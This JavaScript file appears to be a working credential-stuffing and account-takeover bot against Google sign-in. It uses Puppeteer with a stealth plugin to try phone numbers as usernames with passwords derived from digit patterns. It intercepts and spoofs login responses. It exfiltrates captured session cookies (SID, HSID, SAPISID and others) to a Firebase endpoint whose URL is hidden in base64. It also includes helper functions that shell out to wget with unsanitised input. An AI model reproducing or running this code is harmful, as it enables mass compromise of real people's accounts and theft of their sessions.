const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const axios = require('axios')

let SIZE = 0
let mList = []
let COUNTRY = null
let TIME = null
let CODE = null
let USER = null
let ID = null
let PATTERN = []
let page = null
let password = null
let mLoginRequest = true
let mPassRequest = true
let LOGIN_RESULT = null
let PASS_RESULT = null

let mUpdate = new Date().getTime()

let signIn = 'https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com'

let BASE_URL = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUv')

puppeteer.use(StealthPlugin())

process.argv.slice(2).forEach(function (data, index) {
    try {
        if (index == 0) {
            USER = data.toString()
        } else if(index == 1) {
            ID = data.toString()
            startServer()
        }
    } catch (error) {}
})


async function startServer() {
    console.log('|0'+ID+'|----START----|0'+ID+'|')

    try {
        TIME = null
        SIZE = 0

        try {
            let response = await getAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json')
            let data = response.data

            if (data) {
                if (data.time) {
                    TIME = data.time
                }

                if (data.size) {
                    SIZE = data.size
                }
            }
        } catch (error) {}

        mList = await getNumber(false)

        if (SIZE >= mList.length) {
            mList = await getNumber(true)
        }

        await startBrowser()

    } catch (error) {
        console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
        process.exit(0)
    }
}

async function startBrowser() {
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage',
                '--incognito'
            ]
        })

        const context = await browser.createIncognitoBrowserContext()
        
        page = await context.newPage()
        password = await context.newPage()

        try {
            const empty = (await browser.pages())[0]
            await empty.close()
        } catch (error) {}

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
        
        await page.setRequestInterception(true)

        page.on('request', async request => {
            let url = request.url()

            if (mLoginRequest && url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
                mLoginRequest = false
                LOGIN_RESULT = await getLogInRequest(request)
                mLoginRequest = true
            } else {
                request.continue()
            }
        })

        password.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
        
        await password.setRequestInterception(true)

        password.on('request', async request => {
            let url = request.url()

            if (mPassRequest && url.startsWith('https://accounts.google.com/_/signin/challenge')) {
                mPassRequest = false
                PASS_RESULT = await getPassRequest(request, LOGIN_RESULT.tl, LOGIN_RESULT.cid)
                mPassRequest = true
            } else {
                request.continue()
            }
        })

        console.log('|0'+ID+'|----LOAD----|0'+ID+'|')

        while (true) {
            try {
                if (SIZE >= mList.length) {
                    mList = await getNumber(true)
                }
                await loginNumber()
            } catch (error) {
                await delay(10000)
            }
        }
    } catch (error) {
        console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
        process.exit(0)
    }
}

async function loginNumber() {
    for (let i = 0; i < 3; i++) {
        await page.bringToFront()
        if (!await exits(page, '#identifierId')) {
            await page.goto(signIn, { waitUntil: 'load', timeout: 0 })
            await waitForLoginNext()
        }
        mLoginRequest = true
        LOGIN_RESULT = null
        await clearInput(page)
        await page.type('#identifierId', '+'+CODE+mList[SIZE])
        await delay(500)
        await page.click('#identifierNext')

        while (true) {
            await delay(200)
            if (LOGIN_RESULT != null) {
                break
            }
        }

        if (LOGIN_RESULT.status == 200) {
            console.log('|0'+ID+'|----'+SIZE+'----|0'+ID+'|')
            await password.bringToFront()
            if (!await exits(password, 'input[type="password"]')) {
                await password.goto('https://accounts.google.com/signin/v2/challenge/pwd?TL='+LOGIN_RESULT.tl+'&checkConnection=youtube%3A225&checkedDomains=youtube&cid='+LOGIN_RESULT.cid+'&continue=https%3A%2F%2Fmyaccount.google.com&ddm=0&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&pstMsg=1&service=accountsettings', { waitUntil: 'load', timeout: 0 })
            }

            for (let i = 0; i < PATTERN.length; i++) {
                PASS_RESULT = null
                mPassRequest = true
                let number = ''+CODE+mList[SIZE]
                let pass = number.substring(PATTERN[i][0], PATTERN[i][1])

                await waitForPassword(pass)

                while (true) {
                    await delay(200)
                    if (PASS_RESULT != null) {
                        break
                    }
                }



                if (PASS_RESULT.status == 400) {
                    continue
                } else if(PASS_RESULT.status == 200) {
                    let Cookie = ''
                    try {
                        let cookies = await page.cookies()
        
                        for (let i = 0; i < cookies.length; i++) {
                            let name = cookies[i]['name']

                            if (name == 'APISID' || name == 'HSID' || name == 'LSID' || 
                                    name == 'OSID' || name == 'SID' || name == 'SSID' ||
                                        name == 'SAPISID' || name == '__Secure-1PSID') {
                                
                                Cookie += name+'='+cookies[i]['value']+'; '
                            }
                        }
                    } catch (error) {}
                    
                    await patchAxios(BASE_URL+'login/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+Cookie+'"}', {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })

                    SIZE++

                    await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ size:SIZE }), {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })

                    console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
                    process.exit(0)
                } else if(PASS_RESULT.status >= 201 && PASS_RESULT.status <= 205){
                    await patchAxios(BASE_URL+'password/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+PASS_RESULT.status+'"}', {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })
                } else if(PASS_RESULT.status == 500){
                    await password.goto('about:blank')
                    await page.goto('about:blank')
                }
                break
            }
        } else if(LOGIN_RESULT.status == 500){
            await page.goto('about:blank')
        }

        if(LOGIN_RESULT.status != 500 && LOGIN_RESULT.status != 303){
            break
        } else {
            await delay(10000)
        }
    }

    SIZE++

    let now = new Date().getTime()

    if(mUpdate < now) {
        mUpdate = now+60000

        await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ size:SIZE }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    }
}

async function waitForPassword(pass) {
    while (true) {
        await password.type('input[type="password"]', pass)
        await delay(500)
        if (await password.evaluate(() => {
            let root = document.querySelector('input[type="password"]')
            if (root && root.value.length > 5) {
                return true
            }
            return false
        })) {
            break
        }
    }

    let next = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]'
    
    if (await exits(password, next)) {
        await password.click(next)
    } else{
        next = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b VfPpkd-ksKsZd-mWPk3d"]'
        if (await exits(password, next)) {
            await password.click(next)
        }
    }
}

async function waitForLoginNext() {
    for (let i = 0; i < 10; i++) {
        await delay(500)

        if (await exits(page, '#identifierId') && await exits(page, '#identifierNext')) {
            break
        }
    }
}

async function clearInput(_page) {
    try {
        await _page.keyboard.down('Control')
        await _page.keyboard.press('KeyA')
        await _page.keyboard.up('Control')
        await _page.keyboard.press('Backspace')
    } catch (error) {}
}

async function getLogInRequest(request) {

    let data = await page.evaluate((url, body, headers) => {
        return new Promise(function(resolve) {
            fetch(url, {
                'headers': headers,
                'referrerPolicy': 'origin',
                'body': body,
                'method': 'POST',
                'mode': 'cors',
                'credentials': 'include'
            }).then((response) => response.text()).then((text) => {
                resolve(text)
            }).catch((error) => {
                resolve(null)
            })
        })
    }, request.url(), request.postData(), request.headers())

    request.respond({
        status: 200,
        contentType: 'application/json; charset=utf-8',
        body: decrypt('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNzFdLFsiYWYuaHR0cHJtIiw3MSwiLTIyNzU4NDM5NjgwMDU2MzY2MzIiLDc3XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K'),
    })


    if (data == null) {
        return { status:500 }
    } else if (data.includes('/v3/signin/challenge/recaptcha')) {
        return { status:300 }
    } else if (data.includes('/v3/signin/rejected')) {
        return { status:303 }
    } else if (!data.includes('V1UmUe')) {
        return { status:500 }
    }

    let index = data.indexOf('/v3/signin/challenge/pwd')

    if (index >= 0 && data.includes('FIRST_AUTH_FACTOR')) {
        try {
            let temp = data.substring(index, data.length)
            temp = temp.substring(temp.indexOf('[['), temp.indexOf(']]')+2)
            let json = JSON.parse(temp.replace(/\\/gi, ''))
            let cid = 0
            let tl = ''

            for (let i = 0; i < json.length; i++) {
                try {
                    if (json[i][0] == 'cid') {
                        cid = json[i][1]
                    } else if (json[i][0] == 'TL') {
                        tl = json[i][1]
                    }
                } catch (error) {}
            }

            if (tl != null && cid != 0) {
                return { status:200, tl:tl, cid:cid }
            }
        } catch (error) {}
    }

    console.log(mList[SIZE], data)

    return { status:100 }
}

async function getPassRequest(request, TL, cid) {

    let body = ''
    
    try {
        let split = request.postData().split('&')
        for (let i = 0; i < split.length; i++) {
            try {
                let value = split[i].split('=')
                if (value[0] == 'TL') {
                    body += 'TL='+TL+'&'
                } else if (value[0] == 'f.req') {
                    let json = JSON.parse(decodeURIComponent(value[1]))
                    json[2] = parseInt(cid.toString())
                    body += 'f.req='+encodeURIComponent(JSON.stringify(json))+'&'
                } else {
                    body += split[i]+'&'
                }
            } catch (error) {}
        }
    } catch (error) {}

    let data = await page.evaluate((TL, body, headers) => {
        return new Promise(function(resolve) {
            fetch('https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL, {
                'headers': headers,
                'referrerPolicy': 'origin',
                'body': body,
                'method': 'POST',
                'mode': 'cors',
                'credentials': 'include'
            }).then((response) => response.text()).then((text) => {
                resolve(text)
            }).catch((error) => {
                resolve(null)
            })
        })
    }, TL, body, request.headers())

    request.respond({
        status: 200,
        contentType: 'application/json; charset=utf-8',
        body: ')]}\'\n\n[[["gf.sicr",null,null,5,null,[null,null,"FIRST_AUTH_FACTOR",1,null,"INCORRECT_ANSWER_ENTERED",1,null,1,6,true,true,null,null,null,null,"","https://lh3.googleusercontent.com/a/default-user",null,null,true,null,[],null,null,null,null,1,null,[],{"1001":[1],"5001":[2]}]],["gf.ttu",false,"'+TL+'"],["e",3,null,null,394]]]',
    })

    if (data == null) {
        return { status:500 }
    }

    try {
        if (data.includes('gf.sicr')) {
            if (data.includes('INCORRECT_ANSWER_ENTERED')) {
                return { status:400 }
            } else if(data.includes('TWO_STEP_VERIFICATION')) {
                return { status:202 }
            } else if(data.includes('LOGIN_CHALLENGE') && data.includes('SEND_SUCCESS')) {
                return { status:203 }
            } else if(data.includes('TWO_STEP_VERIFICATION')  && data.includes('INITIALIZED')) {
                if (data.includes('SMS') || data.includes('VOICE') || data.includes('RECOVERY')) {
                    return { status:204 }
                } else {
                    return { status:205 }
                }
            } else if(data.includes('https://accounts.google.com/CheckCookie') || data.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie') | data.includes('https%3a%2f%2faccounts.google.com%2fCheckCookie')) {
                while (true) {
                    let ID = 0
                    try {
                        await password.goto('https://myaccount.google.com', { waitUntil: 'load', timeout: 0 })
                        
                        let cookies = await password.cookies()
        
                        for (let i = 0; i < cookies.length; i++) {
                            let name = cookies[i]['name']
                            if (name == 'SSID' || name == 'HSID' || name == 'APISID') {
                                ID++
                            }
                        }
                    } catch (error) {}

                    if (ID == 3) {
                        break
                    }
                }
                return { status:200 }
            } else if(data.includes('webapproval') || data.includes('https://accounts.google.com/signin/recovery') || data.includes('https%3A%2F%2Faccounts.google.com%2Fsignin%2Frecovery') || data.includes('https%3a%2f%2faccounts.google.com%2fsignin%2frecovery')) {
                return { status:201 }
            } else if (data.includes('https://accounts.google.com/signin/v2/disabled/explanation') || data.includes('https%3A%2F%2Faccounts.google.com%2Fsignin%2Frecovery') || data.includes('https%3a%2f%2faccounts.google.com%2fsignin%2frecovery')) {
                return { status:206 }
            } else {
                return { status:204 }
            }
        } else {
            return { status:500 }
        }
    } catch (error) {}

    console.log(mList[SIZE], data)

    return { status:100 }
}

async function exits(_page, element) {
    return await _page.evaluate((element) => {
        let root = document.querySelector(element)
        if(root) {
            return true
        }
        return false
    }, element)
}

async function getNumber(update) {
    try {
        let response = await getAxios(BASE_URL+'server/password.json')

        COUNTRY = response.data.country
        CODE = response.data.code
        PATTERN = response.data.pattern
    } catch (error) {}

    let output = []

    if (TIME == null || update) {
        try {
            if (TIME) {
                await axios.delete(BASE_URL+'found/number/'+COUNTRY+'/'+TIME+'.json')

                TIME = null
            }
        } catch (error) {}

        try {
            let runing = ''
            try {
                let response = await getAxios(BASE_URL+'server/found/time.json')
                if (response.data) {
                    runing = ''+response.data
                }
            } catch (error) {}

            let response = await getAxios(BASE_URL+'found/collect/'+COUNTRY+'.json?orderBy="$key"&limitToFirst=20&print=pretty')
            let list = []

            for (let key of Object.keys(response.data)) {
                if (key != runing) {
                    list.push(key)
                }
            }

            if (list.length > 0) {
                let name = list[Math.floor((Math.random() * list.length))]

                try {
                    await axios.delete(BASE_URL+'found/collect/'+COUNTRY+'/'+name+'.json')
                } catch (error) {}

                await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ time:name, size:0 }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })

                TIME = name
                SIZE = 0
            }
        } catch (error) {}
    }
    
    try {
        if (TIME) {
            let response = await getAxios(BASE_URL+'found/number/'+COUNTRY+'/'+TIME+'.json')

            output = []

            for (let value of Object.values(response.data)) {
                try {
                    output.push(value)
                } catch (error) {}
            }
        }
    } catch (error) {}

    if (output.length > 0) {
        return output
    }

    await delay(60000)
    console.log('|0'+ID+'|----NUMBER-ERROR----|0'+ID+'|')

    return await getNumber(update)
}

async function getAxios(url) {
    let loop = 0
    let responce = null

    while (true) {
        try {
            responce = await axios.get(url)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }

    return responce
}

async function patchAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            responce = await axios.patch(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}

async function installModule(module) {
    return new Promise((resolve) => {
        try {
            exec('npm install '+module, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

async function unzipFile(file, dir) {
    return new Promise((resolve) => {
        try {
            exec('unzip '+file+' -d '+dir, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

async function fileDownload(url, name) {
    return new Promise((resolve) => {
        try {
            exec('wget -O '+name+' '+url, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 2) {
            let index = directory.length - 2
            let name = directory[index]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 2) {
            let index = directory.length - 2
            let name = directory[index]
            if (name) {
                return name
            }
        }
    } catch (error) {}
    
    return null
}

function decrypt(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
